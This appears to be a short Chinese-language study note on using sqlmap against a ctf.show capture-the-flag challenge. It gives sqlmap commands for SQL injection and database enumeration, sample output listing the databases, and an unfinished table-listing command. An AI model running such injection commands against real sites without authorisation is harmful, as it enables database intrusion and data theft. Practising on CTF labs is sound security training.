# sqlmap使用

<br>

* 常用参数
````
常用参数
--dbs 所有数据库
--tables 所有表
--columns 所有列

````

<br>

### 第一步：开始脚本注入

<br>


* 使用sqlmap -u url来进行注入

例：

sqlmap -u "http://d96b8b94-0e30-4e6a-810b-caf654fe2b02.challenge.ctf.show/?id="

<br>

### 第二步：查表

执行上述命令后得到注入成功的回显然后可以进行查库操作

<br>

如上述命令执行后得到

````

available databases [7]:                                                                                                                                                                                    
[*] ctfshow
[*] ctftraining
[*] information_schema
[*] mysql
[*] performance_schema
[*] security
[*] test

````

<br>

* 接下来可以查看指定库的所有表：sqlmap -u "http://d96b8b94-0e30-4e6a-810b-caf654fe2b02.challenge.ctf.show/?id=" -D 
* 